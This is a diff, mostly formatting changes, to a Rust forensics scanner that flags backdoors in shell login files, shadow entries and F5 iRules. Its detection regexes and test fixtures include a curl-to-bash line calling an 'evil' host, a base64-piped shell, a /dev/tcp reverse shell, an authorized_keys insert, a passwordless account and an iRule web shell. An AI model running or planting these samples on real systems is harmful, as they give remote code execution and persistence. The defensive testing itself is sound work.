@@ -191,15 +191,20 @@ fn scan_shell_dotfile(content: &str) -> Option<(&'static str, &'static str)> {
         || subst_exec.is_match(&live)
         || reverse_shell.is_match(&live)
     {
-        return Some(("alert", "downloads-and-runs code or opens a reverse shell at login"));
+        return Some((
+            "alert",
+            "downloads-and-runs code or opens a reverse shell at login",
+        ));
     }
 
     // warn-level: persistence bookkeeping — key/cron install run from a dotfile.
-    let key_append =
-        regex::Regex::new(r"(?s)authorized_keys|\.ssh/").expect("re");
+    let key_append = regex::Regex::new(r"(?s)authorized_keys|\.ssh/").expect("re");
     let scheduling = regex::Regex::new(r"\b(crontab\b|\bat\s+now|systemctl\s+enable)").expect("re");
     if key_append.is_match(&live) || scheduling.is_match(&live) {
-        return Some(("warn", "writes SSH keys or schedules a task from a login file"));
+        return Some((
+            "warn",
+            "writes SSH keys or schedules a task from a login file",
+        ));
     }
     None
 }
@@ -294,26 +299,55 @@ fn scan_irules(rules: &[J]) -> Vec<IruleFinding> {
         let has_event = sigs.event.is_match(body);
 
         let (severity, reason) = if has_code && (has_source || has_decode) {
-            ("alert", "attacker-controlled request data reaches a Tcl code-evaluation sink (eval/subst)")
+            (
+                "alert",
+                "attacker-controlled request data reaches a Tcl code-evaluation sink (eval/subst)",
+            )
         } else if has_net && (has_source || has_decode) {
-            ("alert", "attacker-controlled data is sent off-box (sideband / HSL) — possible C2 / exfil")
+            (
+                "alert",
+                "attacker-controlled data is sent off-box (sideband / HSL) — possible C2 / exfil",
+            )
         } else if has_ilx && (has_source || has_decode) {
-            ("alert", "attacker-controlled data is passed to an iRules LX (Node.js) call")
+            (
+                "alert",
+                "attacker-controlled data is passed to an iRules LX (Node.js) call",
+            )
         } else if has_ilx {
-            ("warn", "calls out to iRules LX (Node.js) — review the extension")
+            (
+                "warn",
+                "calls out to iRules LX (Node.js) — review the extension",
+            )
         } else if has_net {
-            ("warn", "opens an off-box connection (sideband / HSL) — review the destination")
+            (
+                "warn",
+                "opens an off-box connection (sideband / HSL) — review the destination",
+            )
         } else if has_code && has_event {
-            ("warn", "runs a Tcl code-evaluation sink (eval/subst) while processing a request")
+            (
+                "warn",
+                "runs a Tcl code-evaluation sink (eval/subst) while processing a request",
+            )
         } else if sigs.magic_trigger.is_match(body) {
-            ("warn", "branches on a hard-coded header/cookie/URI value — a possible backdoor trigger")
+            (
+                "warn",
+                "branches on a hard-coded header/cookie/URI value — a possible backdoor trigger",
+            )
         } else {
             continue;
         };
 
         let name = str_field(o, "fullPath");
-        let name = if name.is_empty() { str_field(o, "name") } else { name };
-        findings.push(IruleFinding { name: name.to_owned(), severity, reason });
+        let name = if name.is_empty() {
+            str_field(o, "name")
+        } else {
+            name
+        };
+        findings.push(IruleFinding {
+            name: name.to_owned(),
+            severity,
+            reason,
+        });
     }
     findings
 }
@@ -516,7 +550,10 @@ pub fn collect_forensics(files: &[J], rules: &[J]) -> J {
     // iRule web-shell / covert C2 — attacker input reaching a code / off-box
     // sink, backdoor triggers, iRules LX.
     let irule_findings = scan_irules(rules);
-    let ir_alert: Vec<&IruleFinding> = irule_findings.iter().filter(|f| f.severity == "alert").collect();
+    let ir_alert: Vec<&IruleFinding> = irule_findings
+        .iter()
+        .filter(|f| f.severity == "alert")
+        .collect();
     let ir_reason = irule_findings.first().map_or("", |f| f.reason);
     let ir_verdict = if !ir_alert.is_empty() {
         "alert"
@@ -589,7 +626,10 @@ mod tests {
         )]);
         assert_eq!(verdict(&flagged, "ssh-authorized-keys"), "alert");
 
-        let empty = fx(&[file("root/.ssh/authorized_keys", Some("# only a comment\n"))]);
+        let empty = fx(&[file(
+            "root/.ssh/authorized_keys",
+            Some("# only a comment\n"),
+        )]);
         assert_eq!(verdict(&empty, "ssh-authorized-keys"), "clear");
 
         let absent = fx(&[file("etc/motd", Some("hi"))]);
@@ -622,11 +662,18 @@ mod tests {
 
     #[test]
     fn sensitive_content_is_not_embedded() {
-        let f = fx(&[file("etc/shadow", Some("root:$6$abc$def:19000:0:99999:7:::\n"))]);
+        let f = fx(&[file(
+            "etc/shadow",
+            Some("root:$6$abc$def:19000:0:99999:7:::\n"),
+        )]);
         let shadow = &f["files"][0];
         assert_eq!(shadow["category"], "accounts");
         assert_eq!(shadow["sensitive"], J::Bool(true));
-        assert_eq!(shadow["content"], J::Null, "shadow content must not be embedded");
+        assert_eq!(
+            shadow["content"],
+            J::Null,
+            "shadow content must not be embedded"
+        );
         // But its metadata (hash/size) is still there for diffing.
         assert_eq!(shadow["sha256"].as_str().unwrap().len(), 64);
     }
@@ -635,7 +682,10 @@ mod tests {
     fn dotfiles_and_logging_surface_as_info() {
         let f = fx(&[
             file("home/admin/.bashrc", Some("export PATH=$PATH\n")),
-            file("etc/syslog-ng/syslog-ng.conf", Some("destination d_remote {};\n")),
+            file(
+                "etc/syslog-ng/syslog-ng.conf",
+                Some("destination d_remote {};\n"),
+            ),
         ]);
         assert_eq!(verdict(&f, "shell-dotfiles"), "info");
         assert_eq!(verdict(&f, "logging-config"), "info");
@@ -651,30 +701,45 @@ mod tests {
 
     #[test]
     fn irule_command_execution_flagged() {
-        let rule = |name: &str, body: &str, default: bool| {
-            json!({"name": name, "fullPath": format!("/Common/{name}"), "body": body, "isDefault": default})
-        };
+        let rule = |name: &str, body: &str, default: bool| json!({"name": name, "fullPath": format!("/Common/{name}"), "body": body, "isDefault": default});
         // Attacker input (HTTP::header) → decode → eval: the web-shell shape → alert.
         let bad = collect_forensics(
             &[],
-            &[rule("shell", "when HTTP_REQUEST { eval [b64decode [HTTP::header X-Cmd]] }", false)],
+            &[rule(
+                "shell",
+                "when HTTP_REQUEST { eval [b64decode [HTTP::header X-Cmd]] }",
+                false,
+            )],
         );
         assert_eq!(verdict(&bad, "irule-backdoor"), "alert");
-        assert_eq!(bad["checklist"].as_array().unwrap().iter()
-            .find(|c| c["id"] == "irule-backdoor").unwrap()["evidence"][0], "/Common/shell");
+        assert_eq!(
+            bad["checklist"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .find(|c| c["id"] == "irule-backdoor")
+                .unwrap()["evidence"][0],
+            "/Common/shell"
+        );
 
         // A benign HTTP rule (no eval/source/sink) → clear.
         let ok = collect_forensics(
             &[],
-            &[rule("redirect", "when HTTP_REQUEST { HTTP::redirect https://x/ }", false)],
+            &[rule(
+                "redirect",
+                "when HTTP_REQUEST { HTTP::redirect https://x/ }",
+                false,
+            )],
         );
         assert_eq!(verdict(&ok, "irule-backdoor"), "clear");
 
         // eval of a constant outside a request event, and a _sys_ default, don't trip it.
         let benign = collect_forensics(
             &[],
-            &[rule("startup", "when RULE_INIT { eval {set x 1} }", false),
-              rule("_sys_https_redirect", "when HTTP_REQUEST { eval x }", true)],
+            &[
+                rule("startup", "when RULE_INIT { eval {set x 1} }", false),
+                rule("_sys_https_redirect", "when HTTP_REQUEST { eval x }", true),
+            ],
         );
         assert_eq!(verdict(&benign, "irule-backdoor"), "clear");
 
@@ -688,7 +753,11 @@ mod tests {
         // Off-box C2 of attacker data → alert.
         let c2 = collect_forensics(
             &[],
-            &[rule("beacon", "when HTTP_REQUEST { set d [HTTP::uri]; sideband send $d }", false)],
+            &[rule(
+                "beacon",
+                "when HTTP_REQUEST { set d [HTTP::uri]; sideband send $d }",
+                false,
+            )],
         );
         assert_eq!(verdict(&c2, "irule-backdoor"), "alert");
     }
@@ -696,33 +765,61 @@ mod tests {
     #[test]
     fn dotfile_download_run_flagged_alert() {
         // curl | bash at login → alert.
-        let a = fx(&[file("root/.bashrc", Some("export PATH=$PATH\ncurl http://evil/x | bash\n"))]);
+        let a = fx(&[file(
+            "root/.bashrc",
+            Some("export PATH=$PATH\ncurl http://evil/x | bash\n"),
+        )]);
         assert_eq!(verdict(&a, "shell-dotfiles"), "alert");
 
         // base64 -d | sh → alert.
-        let b = fx(&[file("home/admin/.bash_profile", Some("echo aGkK | base64 -d | sh\n"))]);
+        let b = fx(&[file(
+            "home/admin/.bash_profile",
+            Some("echo aGkK | base64 -d | sh\n"),
+        )]);
         assert_eq!(verdict(&b, "shell-dotfiles"), "alert");
 
         // A reverse shell → alert.
-        let rs = fx(&[file("root/.bashrc", Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"))]);
+        let rs = fx(&[file(
+            "root/.bashrc",
+            Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"),
+        )]);
         assert_eq!(verdict(&rs, "shell-dotfiles"), "alert");
 
         // Installing an SSH key from a dotfile → warn.
-        let w = fx(&[file("root/.bashrc", Some("echo KEY >> ~/.ssh/authorized_keys\n"))]);
+        let w = fx(&[file(
+            "root/.bashrc",
+            Some("echo KEY >> ~/.ssh/authorized_keys\n"),
+        )]);
         assert_eq!(verdict(&w, "shell-dotfiles"), "warn");
 
         // A benign dotfile → info; a commented-out curl|sh does NOT trip it.
-        let ok = fx(&[file("home/admin/.bashrc", Some("# curl http://x | sh\nexport EDITOR=vi\n"))]);
+        let ok = fx(&[file(
+            "home/admin/.bashrc",
+            Some("# curl http://x | sh\nexport EDITOR=vi\n"),
+        )]);
         assert_eq!(verdict(&ok, "shell-dotfiles"), "info");
     }
 
     #[test]
     fn shadow_passwordless_account_flagged() {
-        let f = fx(&[file("etc/shadow", Some("root:$6$abc$def:19000:0:99999:7:::\nbackdoor::19000:0:99999:7:::\n"))]);
+        let f = fx(&[file(
+            "etc/shadow",
+            Some("root:$6$abc$def:19000:0:99999:7:::\nbackdoor::19000:0:99999:7:::\n"),
+        )]);
         assert_eq!(verdict(&f, "local-accounts"), "warn");
-        let ev = f["checklist"].as_array().unwrap().iter()
-            .find(|c| c["id"] == "local-accounts").unwrap()["evidence"].as_array().unwrap().clone();
-        assert!(ev.iter().any(|x| x == "backdoor"), "passwordless user listed: {ev:?}");
+        let ev = f["checklist"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|c| c["id"] == "local-accounts")
+            .unwrap()["evidence"]
+            .as_array()
+            .unwrap()
+            .clone();
+        assert!(
+            ev.iter().any(|x| x == "backdoor"),
+            "passwordless user listed: {ev:?}"
+        );
         // Its content is still never embedded.
         assert_eq!(f["files"][0]["content"], J::Null);
     }
